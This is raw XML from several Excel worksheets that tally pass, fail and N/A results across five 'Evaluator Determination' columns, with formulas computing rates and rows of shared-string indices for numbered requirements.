        <f t="array" ref="J13">SUMPRODUCT(--((Table4123[Evaluator Determination 5]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[Evaluator Determination 5]&amp;""))+ISNUMBER(SEARCH("no",Table4123[Evaluator Determination 5]&amp;""))+ISNUMBER(SEARCH("Fail",Table4123[Evaluator Determination 5]&amp;""))&gt;0))</f>
        <v>2</v>
      </c>
    </row>
    <row r="14" spans="1:17" ht="16.8" thickTop="1" thickBot="1">
      <c r="E14" s="10" t="s">
        <v>290</v>
      </c>
      <c r="F14" s="41" cm="1">
        <f t="array" ref="F14">SUMPRODUCT(--((Table4123[Evaluator Determination 1]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[Evaluator Determination 1]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[Evaluator Determination 1]&amp;""))&gt;0))</f>
        <v>2</v>
      </c>
      <c r="G14" s="41" cm="1">
        <f t="array" ref="G14">SUMPRODUCT(--((Table4123[Evaluator Determination 2]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[Evaluator Determination 2]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[Evaluator Determination 2]&amp;""))&gt;0))</f>
        <v>5</v>
      </c>
      <c r="H14" s="41" cm="1">
        <f t="array" ref="H14">SUMPRODUCT(--((Table4123[Evaluator Determination 3]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[Evaluator Determination 3]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[Evaluator Determination 3]&amp;""))&gt;0))</f>
        <v>2</v>
      </c>
      <c r="I14" s="41" cm="1">
        <f t="array" ref="I14">SUMPRODUCT(--((Table4123[Evaluator Determination 4]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[Evaluator Determination 4]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[Evaluator Determination 4]&amp;""))&gt;0))</f>
        <v>6</v>
      </c>
      <c r="J14" s="41" cm="1">
        <f t="array" ref="J14">SUMPRODUCT(--((Table4123[Evaluator Determination 5]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[Evaluator Determination 5]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[Evaluator Determination 5]&amp;""))+ISNUMBER(SEARCH("PASS",Table4123[Evaluator Determination 5]&amp;""))&gt;0))</f>
        <v>3</v>
      </c>
    </row>
    <row r="15" spans="1:17" ht="15" thickTop="1">
      <c r="D15"/>
      <c r="E15"/>
      <c r="F15"/>
      <c r="G15"/>
      <c r="H15"/>
      <c r="I15"/>
      <c r="J15"/>
      <c r="K15"/>
    </row>
    <row r="16" spans="1:17" ht="20.100000000000001" customHeight="1" thickBot="1">
      <c r="E16" s="33" t="s">
        <v>322</v>
      </c>
      <c r="F16" s="45">
        <f>F14/F12</f>
        <v>0.22222222222222221</v>
      </c>
      <c r="G16" s="45">
        <f t="shared" ref="G16:J16" si="0">G14/G12</f>
        <v>1</v>
      </c>
      <c r="H16" s="45">
        <f t="shared" si="0"/>
        <v>0.22222222222222221</v>
      </c>
      <c r="I16" s="45">
        <f t="shared" si="0"/>
        <v>0.75</v>
      </c>
      <c r="J16" s="45">
        <f t="shared" si="0"/>
        <v>0.6</v>
      </c>
    </row>
    <row r="17" spans="5:10" ht="16.8" thickTop="1" thickBot="1">
      <c r="E17" s="33" t="s">
        <v>321</v>
      </c>
      <c r="F17" s="45">
        <f>F14/9</f>
        <v>0.22222222222222221</v>
      </c>
      <c r="G17" s="45">
        <f t="shared" ref="G17:J17" si="1">G14/9</f>
        <v>0.55555555555555558</v>
      </c>
      <c r="H17" s="45">
        <f t="shared" si="1"/>
        <v>0.22222222222222221</v>
      </c>
      <c r="I17" s="45">
        <f t="shared" si="1"/>
        <v>0.66666666666666663</v>
      </c>
      <c r="J17" s="45">
        <f t="shared" si="1"/>
        <v>0.33333333333333331</v>
      </c>
    </row>
    <row r="18" spans="5:10" ht="18" customHeight="1" thickTop="1" thickBot="1">
      <c r="E18" s="33" t="s">
        <v>320</v>
      </c>
      <c r="F18" s="45">
        <f>F13/F12</f>
        <v>0.44444444444444442</v>
      </c>
      <c r="G18" s="45">
        <f t="shared" ref="G18:J18" si="2">G13/G12</f>
        <v>0</v>
      </c>
      <c r="H18" s="45">
        <f t="shared" si="2"/>
        <v>0.77777777777777779</v>
      </c>
      <c r="I18" s="45">
        <f t="shared" si="2"/>
        <v>0</v>
      </c>
      <c r="J18" s="45">
        <f t="shared" si="2"/>
        <v>0.4</v>
      </c>
    </row>
    <row r="19" spans="5:10" ht="18" customHeight="1" thickTop="1" thickBot="1">
      <c r="E19" s="33" t="s">
        <v>319</v>
      </c>
      <c r="F19" s="45">
        <f>F13/9</f>
        <v>0.44444444444444442</v>
      </c>
      <c r="G19" s="45">
        <f t="shared" ref="G19:J19" si="3">G13/9</f>
        <v>0</v>
      </c>
      <c r="H19" s="45">
        <f t="shared" si="3"/>
        <v>0.77777777777777779</v>
      </c>
      <c r="I19" s="45">
        <f t="shared" si="3"/>
        <v>0</v>
      </c>
      <c r="J19" s="45">
        <f t="shared" si="3"/>
        <v>0.22222222222222221</v>
      </c>
    </row>
    <row r="20" spans="5:10" ht="16.8" thickTop="1" thickBot="1">
      <c r="E20" s="33" t="s">
        <v>318</v>
      </c>
      <c r="F20" s="45">
        <f>F12/9</f>
        <v>1</v>
      </c>
      <c r="G20" s="45">
        <f t="shared" ref="G20:J20" si="4">G12/9</f>
        <v>0.55555555555555558</v>
      </c>
      <c r="H20" s="45">
        <f t="shared" si="4"/>
        <v>1</v>
      </c>
      <c r="I20" s="45">
        <f t="shared" si="4"/>
        <v>0.88888888888888884</v>
      </c>
      <c r="J20" s="45">
        <f t="shared" si="4"/>
        <v>0.55555555555555558</v>
      </c>
    </row>
    <row r="21" spans="5:10" ht="15" thickTop="1"/>
    <row r="22" spans="5:10" ht="16.2" thickBot="1">
      <c r="E22" s="42" t="s">
        <v>289</v>
      </c>
      <c r="F22" s="43">
        <f>SUM(Table4123[PASS rate])</f>
        <v>4.0999999999999996</v>
      </c>
    </row>
    <row r="23" spans="5:10" ht="16.8" thickTop="1" thickBot="1">
      <c r="E23" s="9" t="s">
        <v>311</v>
      </c>
      <c r="F23" s="44">
        <f>AVERAGE(Table4123[PASS rate])</f>
        <v>0.45555555555555549</v>
      </c>
    </row>
    <row r="24" spans="5:10" ht="16.8" thickTop="1" thickBot="1">
      <c r="E24" s="9" t="s">
        <v>312</v>
      </c>
      <c r="F24" s="44">
        <f>AVERAGE(Table4123[FAIL Rate])</f>
        <v>0.3888888888888889</v>
      </c>
    </row>
    <row r="25" spans="5:10" ht="16.8" thickTop="1" thickBot="1">
      <c r="E25" s="9" t="s">
        <v>313</v>
      </c>
      <c r="F25" s="44">
        <f>AVERAGE(Table4123[N/A Rate])</f>
        <v>8.8888888888888892E-2</v>
      </c>
    </row>
    <row r="26" spans="5:10" ht="15" thickTop="1"/>
  </sheetData>
  <phoneticPr fontId="18" type="noConversion"/>
  <conditionalFormatting sqref="O2:O10">
    <cfRule type="colorScale" priority="3">
      <colorScale>
        <cfvo type="min"/>
        <cfvo type="percentile" val="50"/>
        <cfvo type="max"/>
        <color rgb="FFF8696B"/>
        <color rgb="FFFFEB84"/>
        <color rgb="FF63BE7B"/>
      </colorScale>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="P2:P10">
    <cfRule type="colorScale" priority="2">
      <colorScale>
        <cfvo type="min"/>
        <cfvo type="percentile" val="50"/>
        <cfvo type="max"/>
        <color rgb="FF63BE7B"/>
        <color rgb="FFFFEB84"/>
        <color rgb="FFF8696B"/>
      </colorScale>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="Q2:Q10">
    <cfRule type="colorScale" priority="1">
      <colorScale>
        <cfvo type="min"/>
        <cfvo type="percentile" val="50"/>
        <cfvo type="max"/>
        <color rgb="FF63BE7B"/>
        <color rgb="FFFFEB84"/>
        <color rgb="FFF8696B"/>
      </colorScale>
    </cfRule>
  </conditionalFormatting>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <ignoredErrors>
    <ignoredError sqref="F2:F3"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0E73-9303-174A-932D-E62A2CD72AE3}">
  <dimension ref="A1:H20"/>
  <sheetViews>
    <sheetView topLeftCell="A3" workbookViewId="0">
      <selection activeCell="B5" sqref="B5"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="11.44140625" defaultRowHeight="14.4"/>
  <cols>
    <col min="1" max="1" width="21.109375" style="1" customWidth="1"/>
    <col min="2" max="2" width="11.44140625" style="1"/>
    <col min="3" max="3" width="27.109375" style="1" customWidth="1"/>
    <col min="4" max="4" width="21" style="1" customWidth="1"/>
    <col min="5" max="5" width="46.33203125" style="1" customWidth="1"/>
    <col min="6" max="6" width="33" style="1" customWidth="1"/>
    <col min="7" max="7" width="29.44140625" style="1" customWidth="1"/>
    <col min="8" max="8" width="18.44140625" style="1" customWidth="1"/>
    <col min="9" max="16384" width="11.44140625" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:8" ht="28.8">
      <c r="A1" s="1" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="1" t="s">
        <v>1</v>
      </c>
      <c r="C1" s="1" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="1" t="s">
        <v>69</v>
      </c>
      <c r="E1" s="1" t="s">
        <v>76</v>
      </c>
      <c r="F1" s="1" t="s">
        <v>68</v>
      </c>
      <c r="G1" s="1" t="s">
        <v>78</v>
      </c>
      <c r="H1" s="12" t="s">
        <v>79</v>
      </c>
    </row>
    <row r="2" spans="1:8" ht="171.6">
      <c r="A2" s="8" t="s">
        <v>4</v>
      </c>
      <c r="B2" s="13">
        <v>1.1000000000000001</v>
      </c>
      <c r="C2" s="8" t="s">
        <v>46</v>
      </c>
      <c r="D2" s="8" t="s">
        <v>73</v>
      </c>
      <c r="E2" s="8" t="s">
        <v>64</v>
      </c>
      <c r="F2" s="8"/>
      <c r="G2" s="8"/>
      <c r="H2" s="8"/>
    </row>
    <row r="3" spans="1:8" ht="100.8">
      <c r="A3" s="1" t="s">
        <v>4</v>
      </c>
      <c r="B3" s="4">
        <v>1.2</v>
      </c>
      <c r="C3" s="1" t="s">
        <v>47</v>
      </c>
      <c r="E3" s="1" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="4" spans="1:8" ht="93.6">
      <c r="A4" s="8" t="s">
        <v>4</v>
      </c>
      <c r="B4" s="13">
        <v>1.3</v>
      </c>
      <c r="C4" s="8" t="s">
        <v>48</v>
      </c>
      <c r="D4" s="8"/>
      <c r="E4" s="8" t="s">
        <v>77</v>
      </c>
      <c r="F4" s="8"/>
      <c r="G4" s="8"/>
      <c r="H4" s="8"/>
    </row>
    <row r="5" spans="1:8" ht="62.4">
      <c r="A5" s="8" t="s">
        <v>4</v>
      </c>
      <c r="B5" s="13">
        <v>1.6</v>
      </c>
      <c r="C5" s="8" t="s">
        <v>49</v>
      </c>
      <c r="D5" s="8" t="s">
        <v>80</v>
      </c>
      <c r="E5" s="8" t="s">
        <v>50</v>
      </c>
      <c r="F5" s="8"/>
      <c r="G5" s="8"/>
      <c r="H5" s="8"/>
    </row>
    <row r="6" spans="1:8" ht="93.6">
      <c r="A6" s="8" t="s">
        <v>4</v>
      </c>
      <c r="B6" s="13">
        <v>1.7</v>
      </c>
      <c r="C6" s="8" t="s">
        <v>51</v>
      </c>
      <c r="D6" s="8"/>
      <c r="E6" s="8" t="s">
        <v>52</v>
      </c>
      <c r="F6" s="8"/>
      <c r="G6" s="8"/>
      <c r="H6" s="8"/>
    </row>
    <row r="7" spans="1:8" ht="57.6">
      <c r="A7" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B7" s="4">
        <v>2.1</v>
      </c>
      <c r="C7" s="1" t="s">
        <v>31</v>
      </c>
      <c r="E7" s="1" t="s">
        <v>32</v>
      </c>
    </row>
    <row r="8" spans="1:8" ht="129.6">
      <c r="A8" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B8" s="4">
        <v>2.2000000000000002</v>
      </c>
      <c r="C8" s="1" t="s">
        <v>33</v>
      </c>
      <c r="E8" s="2" t="s">
        <v>66</v>
      </c>
    </row>
    <row r="9" spans="1:8" ht="129.6">
      <c r="A9" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B9" s="4">
        <v>2.2999999999999998</v>
      </c>
      <c r="C9" s="1" t="s">
        <v>34</v>
      </c>
      <c r="D9" s="1" t="s">
        <v>35</v>
      </c>
      <c r="E9" s="1" t="s">
        <v>74</v>
      </c>
    </row>
    <row r="10" spans="1:8" ht="86.4">
      <c r="A10" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B10" s="4">
        <v>2.4</v>
      </c>
      <c r="C10" s="1" t="s">
        <v>11</v>
      </c>
      <c r="E10" s="1" t="s">
        <v>75</v>
      </c>
    </row>
    <row r="11" spans="1:8" ht="115.2">
      <c r="A11" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B11" s="4">
        <v>2.5</v>
      </c>
      <c r="C11" s="1" t="s">
        <v>56</v>
      </c>
      <c r="E11" s="2" t="s">
        <v>67</v>
      </c>
    </row>
    <row r="12" spans="1:8" ht="93.6">
      <c r="A12" s="8" t="s">
        <v>8</v>
      </c>
      <c r="B12" s="13" t="s">
        <v>29</v>
      </c>
      <c r="C12" s="8" t="s">
        <v>30</v>
      </c>
      <c r="D12" s="8"/>
      <c r="E12" s="8" t="s">
        <v>77</v>
      </c>
      <c r="F12" s="8"/>
      <c r="G12" s="8"/>
      <c r="H12" s="8"/>
    </row>
    <row r="13" spans="1:8" ht="93.6">
      <c r="A13" s="8" t="s">
        <v>12</v>
      </c>
      <c r="B13" s="13" t="s">
        <v>36</v>
      </c>
      <c r="C13" s="8" t="s">
        <v>37</v>
      </c>
      <c r="D13" s="8"/>
      <c r="E13" s="8" t="s">
        <v>77</v>
      </c>
      <c r="F13" s="8"/>
      <c r="G13" s="8"/>
      <c r="H13" s="8"/>
    </row>
    <row r="14" spans="1:8" ht="86.4">
      <c r="A14" s="1" t="s">
        <v>12</v>
      </c>
      <c r="B14" s="4" t="s">
        <v>39</v>
      </c>
      <c r="C14" s="1" t="s">
        <v>40</v>
      </c>
      <c r="E14" s="1" t="s">
        <v>41</v>
      </c>
    </row>
    <row r="15" spans="1:8" ht="93.6">
      <c r="A15" s="8" t="s">
        <v>12</v>
      </c>
      <c r="B15" s="13" t="s">
        <v>42</v>
      </c>
      <c r="C15" s="8" t="s">
        <v>43</v>
      </c>
      <c r="D15" s="8"/>
      <c r="E15" s="8" t="s">
        <v>77</v>
      </c>
      <c r="F15" s="8"/>
      <c r="G15" s="8"/>
      <c r="H15" s="8"/>
    </row>
    <row r="16" spans="1:8" ht="86.4">
      <c r="A16" s="1" t="s">
        <v>12</v>
      </c>
      <c r="B16" s="4" t="s">
        <v>58</v>
      </c>
      <c r="C16" s="1" t="s">
        <v>59</v>
      </c>
      <c r="E16" s="1" t="s">
        <v>77</v>
      </c>
    </row>
    <row r="17" spans="1:8" ht="86.4">
      <c r="A17" s="1" t="s">
        <v>14</v>
      </c>
      <c r="B17" s="4" t="s">
        <v>60</v>
      </c>
      <c r="C17" s="1" t="s">
        <v>61</v>
      </c>
      <c r="E17" s="1" t="s">
        <v>77</v>
      </c>
    </row>
    <row r="18" spans="1:8" ht="93.6">
      <c r="A18" s="8" t="s">
        <v>14</v>
      </c>
      <c r="B18" s="13" t="s">
        <v>18</v>
      </c>
      <c r="C18" s="8" t="s">
        <v>19</v>
      </c>
      <c r="D18" s="8"/>
      <c r="E18" s="8" t="s">
        <v>77</v>
      </c>
      <c r="F18" s="8"/>
      <c r="G18" s="8"/>
      <c r="H18" s="8"/>
    </row>
    <row r="19" spans="1:8" ht="93.6">
      <c r="A19" s="8" t="s">
        <v>14</v>
      </c>
      <c r="B19" s="13" t="s">
        <v>20</v>
      </c>
      <c r="C19" s="8" t="s">
        <v>21</v>
      </c>
      <c r="D19" s="8"/>
      <c r="E19" s="8" t="s">
        <v>77</v>
      </c>
      <c r="F19" s="8"/>
      <c r="G19" s="8"/>
      <c r="H19" s="8"/>
    </row>
    <row r="20" spans="1:8" ht="46.8">
      <c r="A20" s="8" t="s">
        <v>14</v>
      </c>
      <c r="B20" s="13" t="s">
        <v>22</v>
      </c>
      <c r="C20" s="8" t="s">
        <v>23</v>
      </c>
      <c r="D20" s="8"/>
      <c r="E20" s="8" t="s">
        <v>24</v>
      </c>
      <c r="F20" s="8"/>
      <c r="G20" s="8"/>
      <c r="H20" s="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0F7D0-963B-4678-A435-71B010DF09E1}">
  <dimension ref="A1:I10"/>
  <sheetViews>
    <sheetView tabSelected="1" zoomScale="75" workbookViewId="0">
      <selection activeCell="D1" sqref="D1"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="11.44140625" defaultRowHeight="14.4"/>
  <cols>
    <col min="1" max="1" width="21.109375" style="1" customWidth="1"/>
    <col min="2" max="2" width="9.109375" style="1" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="27.109375" style="1" customWidth="1"/>
    <col min="4" max="4" width="21" style="1" customWidth="1"/>
    <col min="5" max="5" width="46.33203125" style="1" customWidth="1"/>
    <col min="6" max="6" width="26" style="1" bestFit="1" customWidth="1"/>
    <col min="7" max="7" width="33" style="1" customWidth="1"/>
    <col min="8" max="8" width="29.44140625" style="1" customWidth="1"/>
    <col min="9" max="9" width="18.44140625" style="1" customWidth="1"/>
    <col min="10" max="16384" width="11.44140625" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:9" ht="28.8">
      <c r="A1" s="1" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="1" t="s">
        <v>1</v>
      </c>
      <c r="C1" s="1" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="1" t="s">
        <v>69</v>
      </c>
      <c r="E1" s="1" t="s">
        <v>76</v>
      </c>
      <c r="F1" s="1" t="s">
        <v>291</v>
      </c>
      <c r="G1" s="1" t="s">
        <v>68</v>
      </c>
      <c r="H1" s="1" t="s">
        <v>78</v>
      </c>
      <c r="I1" s="12" t="s">
        <v>79</v>
      </c>
    </row>
    <row r="2" spans="1:9" ht="100.8">
      <c r="A2" s="1" t="s">
        <v>4</v>
      </c>
      <c r="B2" s="4">
        <v>1.2</v>
      </c>
      <c r="C2" s="1" t="s">
        <v>47</v>
      </c>
      <c r="E2" s="1" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="3" spans="1:9" ht="115.2">
      <c r="A3" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B3" s="4">
        <v>2.1</v>
      </c>
      <c r="C3" s="1" t="s">
        <v>31</v>
      </c>
      <c r="E3" s="1" t="s">
        <v>32</v>
      </c>
      <c r="F3" s="1" t="s">
        <v>292</v>
      </c>
      <c r="G3" s="1" t="s">
        <v>294</v>
      </c>
      <c r="H3" s="1" t="s">
        <v>295</v>
      </c>
    </row>
    <row r="4" spans="1:9" ht="129.6">
      <c r="A4" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B4" s="4">
        <v>2.2000000000000002</v>
      </c>
      <c r="C4" s="1" t="s">
        <v>33</v>
      </c>
      <c r="E4" s="2" t="s">
        <v>66</v>
      </c>
      <c r="F4" s="2" t="s">
        <v>296</v>
      </c>
      <c r="G4" s="1" t="s">
        <v>293</v>
      </c>
      <c r="H4" s="1" t="s">
        <v>297</v>
      </c>
    </row>
    <row r="5" spans="1:9" ht="129.6">
      <c r="A5" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B5" s="4">
        <v>2.2999999999999998</v>
      </c>
      <c r="C5" s="1" t="s">
        <v>34</v>
      </c>
      <c r="D5" s="1" t="s">
        <v>35</v>
      </c>
      <c r="E5" s="1" t="s">
        <v>74</v>
      </c>
      <c r="F5" s="1" t="s">
        <v>298</v>
      </c>
    </row>
    <row r="6" spans="1:9" ht="187.2">
      <c r="A6" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B6" s="4">
        <v>2.4</v>
      </c>
      <c r="C6" s="1" t="s">
        <v>11</v>
      </c>
      <c r="E6" s="1" t="s">
        <v>75</v>
      </c>
      <c r="F6" s="1" t="s">
        <v>292</v>
      </c>
      <c r="G6" s="1" t="s">
        <v>293</v>
      </c>
      <c r="H6" s="1" t="s">
        <v>300</v>
      </c>
      <c r="I6" s="1" t="s">
        <v>299</v>
      </c>
    </row>
    <row r="7" spans="1:9" ht="115.2">
      <c r="A7" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B7" s="4">
        <v>2.5</v>
      </c>
      <c r="C7" s="1" t="s">
        <v>56</v>
      </c>
      <c r="E7" s="2" t="s">
        <v>67</v>
      </c>
      <c r="F7" s="2" t="s">
        <v>292</v>
      </c>
      <c r="G7" s="1" t="s">
        <v>301</v>
      </c>
      <c r="H7" s="1" t="s">
        <v>302</v>
      </c>
    </row>
    <row r="8" spans="1:9" ht="86.4">
      <c r="A8" s="1" t="s">
        <v>12</v>
      </c>
      <c r="B8" s="4" t="s">
        <v>39</v>
      </c>
      <c r="C8" s="1" t="s">
        <v>40</v>
      </c>
      <c r="E8" s="1" t="s">
        <v>41</v>
      </c>
      <c r="F8" s="1" t="s">
        <v>292</v>
      </c>
      <c r="G8" s="1" t="s">
        <v>303</v>
      </c>
      <c r="H8" s="1" t="s">
        <v>304</v>
      </c>
    </row>
    <row r="9" spans="1:9" ht="86.4">
      <c r="A9" s="1" t="s">
        <v>12</v>
      </c>
      <c r="B9" s="4" t="s">
        <v>58</v>
      </c>
      <c r="C9" s="1" t="s">
        <v>59</v>
      </c>
      <c r="E9" s="1" t="s">
        <v>77</v>
      </c>
    </row>
    <row r="10" spans="1:9" ht="86.4">
      <c r="A10" s="1" t="s">
        <v>14</v>
      </c>
      <c r="B10" s="4" t="s">
        <v>60</v>
      </c>
      <c r="C10" s="1" t="s">
        <v>61</v>
      </c>
      <c r="E10" s="1" t="s">
        <v>77</v>
      </c>
      <c r="F10" s="1" t="s">
        <v>298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61DF-A4F8-B740-B0E1-7F1B094F2D55}">
  <dimension ref="A1:I20"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="C7" sqref="C7"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="11.44140625" defaultRowHeight="14.4"/>
  <cols>
    <col min="1" max="1" width="21.109375" style="1" customWidth="1"/>
    <col min="2" max="2" width="11.44140625" style="1"/>
    <col min="3" max="3" width="27.109375" style="1" customWidth="1"/>
    <col min="4" max="4" width="21" style="1" customWidth="1"/>
    <col min="5" max="5" width="47.6640625" style="1" customWidth="1"/>
    <col min="6" max="6" width="12.44140625" style="1" customWidth="1"/>
    <col min="7" max="7" width="29.44140625" style="1" customWidth="1"/>
    <col min="8" max="8" width="26.44140625" style="1" customWidth="1"/>
    <col min="9" max="16384" width="11.44140625" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:9" ht="57.6">
      <c r="A1" s="1" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="1" t="s">
        <v>1</v>
      </c>
      <c r="C1" s="1" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="1" t="s">
        <v>69</v>
      </c>
      <c r="E1" s="1" t="s">
        <v>76</v>
      </c>
      <c r="F1" s="1" t="s">
        <v>285</v>
      </c>
      <c r="G1" s="1" t="s">
        <v>78</v>
      </c>
      <c r="H1" s="12" t="s">
        <v>79</v>
      </c>
      <c r="I1" s="27" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="2" spans="1:9" ht="156" hidden="1">
      <c r="A2" s="28" t="s">
        <v>4</v>
      </c>
      <c r="B2" s="29">
        <v>1.1000000000000001</v>
      </c>
      <c r="C2" s="28" t="s">
        <v>46</v>
      </c>
      <c r="D2" s="28" t="s">
        <v>73</v>
      </c>
      <c r="E2" s="28" t="s">
        <v>64</v>
      </c>
      <c r="F2" s="28" t="b">
        <v>1</v>
      </c>
      <c r="G2" s="28" t="s">
        <v>209</v>
      </c>
      <c r="H2" s="28" t="s">
        <v>81</v>
      </c>
      <c r="I2" s="28" t="s">
        <v>207</v>
      </c>
    </row>
    <row r="3" spans="1:9" ht="187.2">
      <c r="A3" s="1" t="s">
        <v>4</v>
      </c>
      <c r="B3" s="4">
        <v>1.2</v>
      </c>
      <c r="C3" s="1" t="s">
        <v>47</v>
      </c>
      <c r="E3" s="1" t="s">
        <v>72</v>
      </c>
      <c r="F3" s="1" t="b">
        <v>0</v>
      </c>
      <c r="G3" s="1" t="s">
        <v>90</v>
      </c>
      <c r="H3" s="1" t="s">
        <v>82</v>
      </c>
    </row>
    <row r="4" spans="1:9" ht="93.6" hidden="1">
      <c r="A4" s="8" t="s">
        <v>4</v>
      </c>
      <c r="B4" s="13">
        <v>1.3</v>
      </c>
      <c r="C4" s="7" t="s">
        <v>48</v>
      </c>
      <c r="D4" s="8"/>
      <c r="E4" s="8" t="s">
        <v>77</v>
      </c>
      <c r="F4" s="8"/>
      <c r="G4" s="8" t="s">
        <v>85</v>
      </c>
      <c r="H4" s="14" t="s">
        <v>86</v>
      </c>
    </row>
    <row r="5" spans="1:9" ht="78" hidden="1">
      <c r="A5" s="8" t="s">
        <v>4</v>
      </c>
      <c r="B5" s="13">
        <v>1.6</v>
      </c>
      <c r="C5" s="8" t="s">
        <v>49</v>
      </c>
      <c r="D5" s="8" t="s">
        <v>80</v>
      </c>
      <c r="E5" s="8" t="s">
        <v>50</v>
      </c>
      <c r="F5" s="8"/>
      <c r="G5" s="8"/>
      <c r="H5" s="8" t="s">
        <v>84</v>
      </c>
    </row>
    <row r="6" spans="1:9" ht="93.6" hidden="1">
      <c r="A6" s="28" t="s">
        <v>4</v>
      </c>
      <c r="B6" s="29">
        <v>1.7</v>
      </c>
      <c r="C6" s="28" t="s">
        <v>51</v>
      </c>
      <c r="D6" s="28"/>
      <c r="E6" s="28" t="s">
        <v>52</v>
      </c>
      <c r="F6" s="28" t="b">
        <v>0</v>
      </c>
      <c r="G6" s="28" t="s">
        <v>89</v>
      </c>
      <c r="H6" s="28" t="s">
        <v>88</v>
      </c>
      <c r="I6" s="28" t="s">
        <v>202</v>
      </c>
    </row>
    <row r="7" spans="1:9" ht="129.6">
      <c r="A7" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B7" s="4">
        <v>2.1</v>
      </c>
      <c r="C7" s="1" t="s">
        <v>31</v>
      </c>
      <c r="E7" s="1" t="s">
        <v>32</v>
      </c>
      <c r="F7" s="1" t="b">
        <v>1</v>
      </c>
      <c r="G7" s="1" t="s">
        <v>97</v>
      </c>
      <c r="H7" s="1" t="s">
        <v>87</v>
      </c>
    </row>
    <row r="8" spans="1:9" ht="126" customHeight="1">
      <c r="A8" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B8" s="4">
        <v>2.2000000000000002</v>
      </c>
      <c r="C8" s="1" t="s">
        <v>33</v>
      </c>
      <c r="E8" s="2" t="s">
        <v>66</v>
      </c>
      <c r="F8" s="1" t="b">
        <v>0</v>
      </c>
      <c r="G8" s="1" t="s">
        <v>92</v>
      </c>
      <c r="H8" s="1" t="s">
        <v>91</v>
      </c>
    </row>
    <row r="9" spans="1:9" ht="129.6">
      <c r="A9" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B9" s="4">
        <v>2.2999999999999998</v>
      </c>
      <c r="C9" s="1" t="s">
        <v>34</v>
      </c>
      <c r="D9" s="1" t="s">
        <v>35</v>
      </c>
      <c r="E9" s="1" t="s">
        <v>74</v>
      </c>
      <c r="F9" s="1" t="b">
        <v>0</v>
      </c>
      <c r="G9" s="1" t="s">
        <v>93</v>
      </c>
      <c r="H9" s="1" t="s">
        <v>82</v>
      </c>
    </row>
    <row r="10" spans="1:9" ht="115.2">
      <c r="A10" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B10" s="4">
        <v>2.4</v>
      </c>
      <c r="C10" s="1" t="s">
        <v>11</v>
      </c>
      <c r="E10" s="1" t="s">
        <v>75</v>
      </c>
      <c r="F10" s="1" t="b">
        <v>1</v>
      </c>
      <c r="G10" s="1" t="s">
        <v>94</v>
      </c>
      <c r="H10" s="1" t="s">
        <v>82</v>
      </c>
    </row>
    <row r="11" spans="1:9" ht="115.2">
      <c r="A11" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B11" s="4">
        <v>2.5</v>
      </c>
      <c r="C11" s="1" t="s">
        <v>56</v>
      </c>
      <c r="E11" s="2" t="s">
        <v>67</v>
      </c>
      <c r="F11" s="1" t="b">
        <v>0</v>
      </c>
      <c r="G11" s="1" t="s">
        <v>102</v>
      </c>
      <c r="H11" s="1" t="s">
        <v>98</v>
      </c>
    </row>
    <row r="12" spans="1:9" ht="93.6" hidden="1">
      <c r="A12" s="8" t="s">
        <v>8</v>
      </c>
      <c r="B12" s="13" t="s">
        <v>29</v>
      </c>
      <c r="C12" s="8" t="s">
        <v>30</v>
      </c>
      <c r="D12" s="8"/>
      <c r="E12" s="8" t="s">
        <v>77</v>
      </c>
      <c r="F12" s="8" t="b">
        <v>1</v>
      </c>
      <c r="G12" s="8" t="s">
        <v>95</v>
      </c>
      <c r="H12" s="14" t="s">
        <v>114</v>
      </c>
    </row>
    <row r="13" spans="1:9" ht="93.6" hidden="1">
      <c r="A13" s="8" t="s">
        <v>12</v>
      </c>
      <c r="B13" s="13" t="s">
        <v>36</v>
      </c>
      <c r="C13" s="8" t="s">
        <v>37</v>
      </c>
      <c r="D13" s="8"/>
      <c r="E13" s="8" t="s">
        <v>77</v>
      </c>
      <c r="F13" s="8"/>
      <c r="G13" s="8" t="s">
        <v>104</v>
      </c>
      <c r="H13" s="8" t="s">
        <v>106</v>
      </c>
    </row>
    <row r="14" spans="1:9" ht="115.2">
      <c r="A14" s="1" t="s">
        <v>12</v>
